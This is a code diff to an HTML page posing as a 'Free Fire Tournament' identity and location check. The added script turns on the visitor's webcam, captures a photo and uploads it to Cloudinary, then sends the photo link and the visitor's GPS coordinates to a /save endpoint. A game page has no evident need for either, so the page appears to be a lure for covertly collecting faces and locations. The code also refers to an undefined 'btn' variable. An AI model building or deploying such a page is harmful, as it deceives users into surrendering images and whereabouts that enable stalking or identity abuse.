@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Free Fire Tournament</title>
 <script src="https://cdn.tailwindcss.com"></script>
 
 <style>
-  body {
-    background: radial-gradient(circle at top, #1a0f00, #000);
-  }
+body {
+  background: radial-gradient(circle at top, #1a0f00, #000);
+}
 </style>
 </head>
 
@@ -17,69 +17,97 @@
 
 <div class="max-w-md w-full bg-black/60 backdrop-blur-xl
             border border-orange-500/30 rounded-2xl
-            shadow-2xl p-6 sm:p-8 text-center">
+            shadow-2xl p-6 text-center">
 
-  <!-- Logo / Title -->
-  <div class="mb-4">
-    <h1 class="text-3xl font-bold text-orange-400">
-      Free Fire Tournament
-    </h1>
-    <p class="text-gray-300 text-sm mt-1">
-      Secure gameplay experience
-    </p>
-  </div>
-
-  <!-- Icon -->
-  <div class="flex justify-center my-5">
-    <div class="w-20 h-20 rounded-full bg-orange-500/10
-                flex items-center justify-center">
-      📍
-    </div>
-  </div>
-
-  <!-- Message -->
-  <p id="msg" class="text-gray-200 text-lg mb-4">
-    Please allow location access to continue
+  <h1 class="text-3xl font-bold text-orange-400 mb-1">
+    Free Fire Tournament
+  </h1>
+  <p class="text-gray-400 text-sm mb-4">
+    Identity & Location Verification
   </p>
 
-  <p class="text-gray-400 text-sm mb-6">
-    We use your location to improve accuracy and security and verify you are in india.
+  <!-- Camera -->
+  <div class="rounded-xl overflow-hidden border border-orange-500/30 mb-4">
+    <video id="video" autoplay playsinline class="w-full h-48 object-cover"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+  </div>
+
+  <p id="msg" class="text-gray-200 mb-4">
+    Allow camera & location
   </p>
 
-  <!-- Loader -->
-  <div id="loader" class="hidden mx-auto w-10 h-10 border-4
-       border-orange-400 border-t-transparent rounded-full animate-spin">
+  <button id="verifyBtn"
+    class="w-full bg-orange-500 hover:bg-orange-600
+           text-black font-bold py-2 rounded-lg">
+    Continue
+  </button>
+
+  <div id="loader"
+    class="hidden mx-auto mt-4 w-10 h-10 border-4
+           border-orange-400 border-t-transparent
+           rounded-full animate-spin">
   </div>
 
 </div>
 
 <script>
+  
+const CLOUDINARY_URL = "<%= process.env.CLOUDINARY_URL %>";
+const UPLOAD_PRESET = "<%= process.env.CLOUDINARY_UPLOAD_PRESET %>";
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 const msg = document.getElementById("msg");
 const loader = document.getElementById("loader");
 
-setTimeout(() => {
+/* 🎥 Camera */
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => video.srcObject = stream)
+  .catch(() => msg.innerText = "❌ Camera access denied");
+
+btn.onclick = async () => {
   loader.classList.remove("hidden");
+  msg.innerText = "Verifying…";
 
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
+  navigator.geolocation.getCurrentPosition(async (pos) => {
 
-      await fetch("/save", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ lat, lon })
-      });
+    /* Capture Image */
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
 
-      loader.classList.add("hidden");
-      msg.innerText = "✅ Location verified successfully";
-    },
-    () => {
-      loader.classList.add("hidden");
-      msg.innerText = "❌ Location access denied";
-    }
-  );
-}, 800);
+    /* Upload to Cloudinary */
+    const form = new FormData();
+    form.append("file", blob);
+    form.append("upload_preset", UPLOAD_PRESET);
+
+    const cloudRes = await fetch(CLOUDINARY_URL, {
+      method: "POST",
+      body: form
+    });
+
+    const cloudData = await cloudRes.json();
+
+    /* Save to backend */
+    await fetch("/save", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        imageUrl: cloudData.secure_url
+      })
+    });
+
+    loader.classList.add("hidden");
+    msg.innerText = "✅ Verification Successful";
+
+  }, () => {
+    loader.classList.add("hidden");
+    msg.innerText = "❌ Location denied";
+  });
+};
 </script>
 
 </body>
